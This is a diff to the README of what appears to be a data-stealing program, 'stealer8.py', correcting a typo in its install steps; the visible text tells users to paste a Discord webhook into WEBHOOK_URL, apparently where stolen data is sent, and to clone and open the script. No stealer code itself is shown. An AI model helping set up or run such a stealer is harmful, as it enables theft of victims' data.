@@ -15,7 +15,7 @@ It does this by:
 All you need to do to have this program work is place your discord webhook in the WEBHOOK_URL section:
 - `WEBHOOK_URL = "place your discord webhook here"`
 
-## How to install use the porgram:
+## How to install and use the porgram:
 1. Clone the github repository
 2. Unzip the downloded zip file to a location of your choice
 3. Go to the place of which you unziped the zip file and open the stealer8.py file in a python IDE of your choice. 
